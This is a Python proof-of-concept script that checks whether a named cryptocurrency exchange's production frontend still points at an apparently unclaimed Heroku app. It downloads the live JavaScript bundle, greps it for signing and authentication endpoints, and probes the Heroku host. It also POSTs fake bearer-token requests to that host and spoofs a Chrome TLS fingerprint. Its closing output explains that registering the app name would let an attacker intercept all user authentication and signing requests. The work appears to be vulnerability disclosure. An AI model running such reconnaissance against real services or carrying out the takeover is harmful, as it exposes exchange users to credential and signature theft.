#!/usr/bin/env python3.11
"""
F2 PoC — Step 1: Verify the dead Heroku app and extract proof from the live production bundle.

Usage: python3.11 poc_verify_dead_heroku.py
"""

import sys
import re
import json
import tls_client

BUNDLE_URL  = "https://app.jojo.exchange/static/js/main.69c4a863.js"
HEROKU_HOST = "https://jojo-api-mainnet-0da296028aeb.herokuapp.com"

CHECKS = [
    ("Ge=!0",        "Ge = true (pro mode hardcoded active)"),
    ("herokuapp.com", "herokuapp.com referenced in bundle"),
    ("jojoOrderlyApi","reducerPath jojoOrderlyApi (confirms IF = dead-Heroku API)"),
    ("/private/signature", "POST /private/signature signing endpoint"),
    ("/temporary/orderlyKey", "POST /temporary/orderlyKey (orderly-key source)"),
    ("/authToken",    "POST /authToken (auth + key registration)"),
    (r"\.herokuapp\.com",  "Xe() whitelist: *.herokuapp.com explicitly trusted"),
    ("storeTokenSevenDay", "7-day Bearer tokens stored + sent to restfulDomain"),
]

session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
HDR = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/javascript",
    "Referer": "https://app.jojo.exchange/",
}

print("=" * 70)
print("JOJO Exchange — Heroku App Takeover PoC (Dead Endpoint Verification)")
print("=" * 70)

# ── 1. Download the live production JS bundle ────────────────────────────────
print(f"\n[1] Fetching production bundle: {BUNDLE_URL}")
r = session.get(BUNDLE_URL, headers=HDR, timeout_seconds=30)
if r.status_code != 200:
    print(f"    FAIL: HTTP {r.status_code}")
    sys.exit(1)
bundle = r.text
print(f"    OK: {len(bundle):,} bytes, bundle hash = {BUNDLE_URL.split('/')[-1]}")

# ── 2. Extract the production API base URL ────────────────────────────────────
print("\n[2] Extracting production API config from bundle ...")
m = re.search(r'pro:\{wsDomain:"([^"]+)",restfulDomain:"([^"]+)"', bundle)
if m:
    ws_domain  = m.group(1)
    api_domain = m.group(2)
    print(f"    wsDomain      = {ws_domain}")
    print(f"    restfulDomain = {api_domain}  ← TARGET")
else:
    print("    Could not extract pro config")

m2 = re.search(r'(Ge=!0|Ge=true)', bundle)
print(f"\n[3] Production flag: {'Ge=true (pro mode active)' if m2 else 'NOT FOUND — check manually'}")

# ── 3. Confirm all evidence strings in bundle ─────────────────────────────────
print("\n[4] Bundle evidence checks:")
all_pass = True
for pattern, label in CHECKS:
    found = bool(re.search(pattern, bundle))
    icon  = "✅" if found else "❌"
    print(f"    {icon}  {label}")
    if not found:
        all_pass = False

# ── 4. Verify Heroku app is dead (unregistered) ───────────────────────────────
print(f"\n[5] Probing dead Heroku app: {HEROKU_HOST}")
for path in ["/", "/v2/public/info", "/v2/authToken"]:
    try:
        rh = session.get(HEROKU_HOST + path, headers={
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }, timeout_seconds=12)
        body_preview = rh.text[:120].replace('\n', ' ')
        status_str = "🔴 UNCLAIMED" if rh.status_code == 404 and "No such app" in rh.text else f"HTTP {rh.status_code}"
        print(f"    GET {path:25s} → {status_str}  |  {body_preview}")
    except Exception as e:
        print(f"    GET {path:25s} → ERROR: {e}")

# ── 5. Prove API calls go to dead endpoint right now ─────────────────────────
print(f"\n[6] Sending authenticated-style request to dead Heroku (simulating browser call):")
auth_headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test",
    "orderly-account-address": "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF",
    "Origin": "https://app.jojo.exchange",
    "Referer": "https://app.jojo.exchange/",
    "Content-Type": "application/json",
}
for endpoint in ["/v2/temporary/orderlyKey", "/v2/private/signature", "/v2/authToken"]:
    try:
        rh = session.post(HEROKU_HOST + endpoint, headers=auth_headers,
                         json={"test": 1}, timeout_seconds=12)
        print(f"    POST {endpoint:35s} → HTTP {rh.status_code} ({rh.text[:80].strip()})")
    except Exception as e:
        print(f"    POST {endpoint:35s} → ERROR: {e}")

print("\n" + "=" * 70)
if all_pass:
    print("RESULT: ALL CHECKS PASSED — Heroku app is dead and claimable.")
    print("        An attacker can register 'jojo-api-mainnet-0da296028aeb' on")
    print("        Heroku and intercept ALL authentication and signing requests")
    print("        from production JOJO Exchange users.")
else:
    print("RESULT: Some checks failed — review output above.")
print("=" * 70)
